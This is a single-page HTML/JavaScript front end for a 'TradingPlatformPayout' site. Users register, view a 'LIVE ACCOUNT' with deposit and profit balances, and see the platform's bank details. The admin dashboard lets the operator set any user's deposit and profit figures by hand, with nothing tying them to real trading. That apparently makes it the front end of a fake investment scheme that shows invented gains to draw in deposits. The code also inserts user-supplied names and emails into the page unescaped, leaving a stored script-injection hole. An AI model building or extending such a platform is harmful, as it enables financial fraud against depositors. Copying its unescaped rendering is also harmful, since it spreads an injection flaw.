<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>TradingPlatformPayout</title>
<style>
body{font-family:Arial,sans-serif;background:#f4f7fb;margin:0;color:#17233b}.wrap{max-width:1000px;margin:auto;padding:22px}.nav{background:#fff;padding:16px 22px;border-bottom:1px solid #e4e9f1;display:flex;justify-content:space-between}.brand{font-weight:900;font-size:21px}.brand span{color:#2379d2}.card{background:#fff;border:1px solid #e0e7f0;border-radius:14px;padding:20px;margin:16px 0}.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}.field{margin:10px 0}.field label{display:block;font-size:12px;font-weight:700;margin-bottom:5px}.field input{width:100%;box-sizing:border-box;padding:11px;border:1px solid #d5ddea;border-radius:8px}.btn{border:0;border-radius:8px;padding:11px 15px;font-weight:800;cursor:pointer}.primary{background:#2379d2;color:#fff}.green{background:#e8f7ef;color:#147a47}.red{background:#ffe9e9;color:#a42331}.muted{color:#718096}.balance{background:#142d60;color:white;border-radius:14px;padding:22px}.big{font-size:34px;font-weight:900}.user{border:1px solid #e0e7f0;padding:15px;border-radius:12px;margin:12px 0}.actions{display:flex;gap:8px;flex-wrap:wrap}@media(max-width:700px){.grid{grid-template-columns:1fr}}
</style></head><body>
<div class="nav"><div class="brand">TradingPlatform<span>Payout</span></div><div id="navActions"></div></div>
<div class="wrap" id="app"></div>
<script>
const app=document.getElementById('app'),nav=document.getElementById('navActions');
async function api(url,opt={}){const r=await fetch(url,{headers:{'Content-Type':'application/json'},...opt});const d=await r.json();if(!r.ok)throw Error(d.error||'Request failed');return d}
function form(title,mode){app.innerHTML=`<div class="card"><h2>${title}</h2><div class="field"><label>Email</label><input id="email" type="email"></div><div class="field"><label>Password</label><input id="password" type="password"></div>${mode==='register'?`<div class="field"><label>Full Name</label><input id="name"></div><div class="field"><label>Phone</label><input id="phone"></div><div class="field"><label>Country</label><input id="country"></div>`:''}<button class="btn primary" onclick="${mode==='register'?'register()':'login()'}">${mode==='register'?'Create Account':'Login'}</button><button class="btn" onclick="${mode==='register'?'form(\\'Login\\',\\'login\\')':'form(\\'Create Account\\',\\'register\\')'}">${mode==='register'?'Already registered? Login':'Create Account'}</button><p id="msg" class="muted"></p></div>`}
async function register(){try{await api('/api/register',{method:'POST',body:JSON.stringify({name:name.value,phone:phone.value,country:country.value,email:email.value,password:password.value})});msg.textContent='Account created. It is pending administrator approval.';form('Login','login');}catch(e){msg.textContent=e.message}}
async function login(){try{const d=await api('/api/login',{method:'POST',body:JSON.stringify({email:email.value,password:password.value})});d.role==='admin'?admin():user(d.user)}catch(e){msg.textContent=e.message}}
async function logout(){await api('/api/logout',{method:'POST'});form('Login','login')}
function user(u){nav.innerHTML='<button class="btn" onclick="logout()">Logout</button>';app.innerHTML=`<div class="balance"><div>LIVE ACCOUNT</div><div class="big">$${(u.totalBalance||0).toFixed(2)}</div><div class="grid"><div>Deposit<br><b>$${u.depositBalance.toFixed(2)}</b></div><div>Profit<br><b>$${u.profitBalance.toFixed(2)}</b></div></div></div><div class="card"><h2>Bank Details</h2><div id="bank">Loading...</div></div>`;loadBank()}
async function loadBank(){try{const b=await api('/api/bank');bank.innerHTML=`<p><b>Bank:</b> ${b.bankName||'Not provided'}</p><p><b>Account Name:</b> ${b.accountName||'Not provided'}</p><p><b>Account Number:</b> ${b.accountNumber||'Not provided'}</p><p><b>Routing / Sort Code:</b> ${b.bankCode||'Not provided'}</p>`}catch(e){bank.textContent=e.message}}
async function admin(){nav.innerHTML='<button class="btn" onclick="logout()">Logout</button>';app.innerHTML='<div class="card"><h1>Administrator Dashboard</h1><p class="muted">Shared user accounts and balances</p></div><div class="card"><h2>Platform Bank Details</h2><div class="grid"><input id="bn" placeholder="Bank Name"><input id="an" placeholder="Account Name"><input id="ac" placeholder="Account Number"><input id="bc" placeholder="Routing / Sort Code"></div><br><button class="btn primary" onclick="saveBank()">Save Bank Details</button></div><div class="card"><h2>User Balance Management</h2><div id="users">Loading...</div></div>';loadAdmin()}
async function loadAdmin(){const us=await api('/api/admin/users');users.innerHTML=us.map(u=>`<div class="user"><b>${u.name}</b><br><span class="muted">${u.email} · ${u.status}</span><p>Deposit: <b>$${u.depositBalance.toFixed(2)}</b> &nbsp; Profit: <b>$${u.profitBalance.toFixed(2)}</b> &nbsp; Total: <b>$${u.totalBalance.toFixed(2)}</b></p><div class="actions"><button class="btn green" onclick="change(${u.id},'deposit',1)">+ Deposit</button><button class="btn red" onclick="change(${u.id},'deposit',-1)">− Deposit</button><button class="btn green" onclick="change(${u.id},'profit',1)">+ Profit</button><button class="btn red" onclick="change(${u.id},'profit',-1)">− Profit</button>${u.status==='pending'?`<button class="btn primary" onclick="status(${u.id},'approved')">Approve</button><button class="btn red" onclick="status(${u.id},'rejected')">Reject</button>`:''}</div></div>`).join('')}
async function change(id,type,dir){const n=prompt('Amount to '+(dir>0?'increase':'decrease')+' '+type+':','1000');if(n===null)return;try{await api('/api/admin/users/'+id+'/balance',{method:'POST',body:JSON.stringify({type,amount:Number(n)*dir})});loadAdmin()}catch(e){alert(e.message)}}
async function status(id,s){await api('/api/admin/users/'+id+'/status',{method:'POST',body:JSON.stringify({status:s})});loadAdmin()}
async function saveBank(){await api('/api/admin/bank',{method:'POST',body:JSON.stringify({bankName:bn.value,accountName:an.value,accountNumber:ac.value,bankCode:bc.value})});alert('Bank details saved. Users can now see them.')}
form('Login','login');
</script></body></html>
